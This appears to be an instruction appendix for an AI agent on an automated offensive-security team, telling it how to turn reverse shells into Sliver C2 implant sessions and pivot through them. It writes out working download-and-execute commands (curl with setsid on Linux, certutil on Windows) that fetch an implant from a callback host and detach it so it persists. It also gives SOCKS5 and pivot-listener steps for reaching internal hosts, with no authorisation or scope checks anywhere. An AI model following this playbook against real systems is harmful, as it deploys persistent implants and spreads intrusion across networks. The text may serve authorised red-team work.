# Sliver C2 Backend Appendix

This appendix configures you to use **Sliver C2** as the preferred backend.
Initial shells are always caught via shell-server (teammates handle this).
You upgrade established shells to Sliver C2 sessions for encrypted transport,
file transfer, and pivoting.

**shell-server remains the initial access method.** Teammates establish raw
reverse shells. You upgrade to Sliver through the existing shell.

## Backend Tools

Sliver: `mcp__sliver-server__<tool>`
Shell-server: `mcp__shell-server__<tool>`

## [shell-established] Implementation — C2 Upgrade

When a teammate hands you an established shell-server session:

```
1. Verify session exists via shell-server list_sessions()
2. Stabilize the raw shell first: stabilize_shell(session_id)
3. Determine target OS from platform field
4. Clear stale listeners: list_jobs() → kill_job() for every pre-existing mTLS job.
   Stale jobs cause implant exit code 23 (connection refused). Always start fresh.
5. Start Sliver mTLS listener: start_mtls_listener(port=<free_port>)
6. Generate implant: generate_implant(target_os, arch="amd64",
     mtls_host=<callback_ip>, mtls_port=<listener_port>)
7. Serve implant via HTTP:
   Run: python3 -m http.server <serve_port> --directory <implant_dir>
8. Download + execute implant through the existing shell:
   Linux: send_command(session_id, "curl http://<ip>:<port>/<file> -o /tmp/i && chmod +x /tmp/i && setsid /tmp/i </dev/null >/dev/null 2>&1 &")
   Note: setsid detaches the implant from the PTY session — it survives close_session.
   Windows: send_command(session_id, "certutil -urlcache -f http://<ip>:<port>/<file> C:\\Windows\\Temp\\i.exe && start /b C:\\Windows\\Temp\\i.exe")
9. Poll sliver-server list_sessions() for new Sliver session (3s intervals, 10 attempts)
10. If Sliver session connects:
    a. Stop the HTTP server
    b. Verify the session is alive: execute(session_id, exe="id") — if this succeeds,
       Sliver survived. Only now is it safe to close the shell-server session.
    c. Send [session-ready] with backend=sliver
11. If Sliver upgrade fails (download fails, implant killed, port filtered):
    a. Fall back to shell-server: send [session-ready] with backend=shell-server
    b. The raw shell still works — don't lose it trying to upgrade
```

**Critical: never close the shell-server session until Sliver survives a live execute().**
The raw shell is the fallback. If C2 upgrade fails, the engagement continues
via shell-server.

## [setup-process] Implementation

Credential-based access still uses shell-server:

```
Call mcp__shell-server__start_process(...)
Send [process-ready] with backend=shell-server
```

## [shell-dropped] Recovery

For Sliver sessions: Sliver reconnects automatically (mTLS persistent).
If `list_sessions()` shows `alive=false` after 30s, attempt re-establishment.

For shell-server sessions: same recovery as shell-server appendix —
start new listener, re-deliver saved payload.

## Handoff Instructions

For Sliver sessions:
```
[session-ready] session_id=<id> backend=sliver platform=<linux|windows>
  Use mcp__sliver-server__execute(session_id="<id>", exe="...", args="...") for commands.
  Use mcp__sliver-server__upload/download for file transfer.
```

For shell-server sessions (fallback or credential-based):
```
[session-ready] session_id=<id> backend=shell-server platform=<linux|windows>
  Use mcp__shell-server__send_command(session_id="<id>", command="...") for interaction.
```

## [setup-pivot] Implementation — Sliver SOCKS5

When the lead sends `[setup-pivot]` and you have a Sliver session on the pivot
host, use Sliver's in-band SOCKS5 proxy — no additional tools needed:

```
1. Find the Sliver session on the pivot host: list_sessions()
2. Start SOCKS5 proxy: start_socks_proxy(session_id)
   → Returns endpoint (socks5://127.0.0.1:<port>) and proxychains config
3. Verify connectivity: proxychains4 nc -zv <target_in_subnet> <port>
4. Message state-mgr: [add-tunnel] tunnel_type=socks5-sliver remote_host=<ip>
   remote_network=<cidr> local_port=<port> via_access_id=<N>
5. Send [pivot-ready] to lead with endpoint and proxychains_line
```

**Sliver SOCKS5 tunnels traffic through the implant's C2 channel** — encrypted
mTLS, no extra binary upload, no extra port on target. Equivalent to a chisel
SOCKS proxy but zero-footprint.

If you do NOT have a Sliver session on the pivot host (e.g. only shell-server
access), fall back to loading the `pivoting-tunneling` skill:
```
ToolSearch("select:mcp__skill-router__get_skill")
mcp__skill-router__get_skill(name="pivoting-tunneling")
```
Follow the skill methodology for chisel/sshuttle/ligolo setup.

**C2-level pivoting** (routing a new implant through the pivot host to reach a
deeper target) uses `start_pivot_listener`:
```
1. start_pivot_listener(session_id, "tcp", bind_port=<port>)
2. Generate new implant: mtls_host=<pivot_host_ip>, mtls_port=<pivot_port>
3. Deliver implant to internal target through existing session
4. New Sliver session appears — routed through the pivot
```
Use this when you need a full C2 session on an internal host, not just network
routing. The lead will specify which approach is needed.
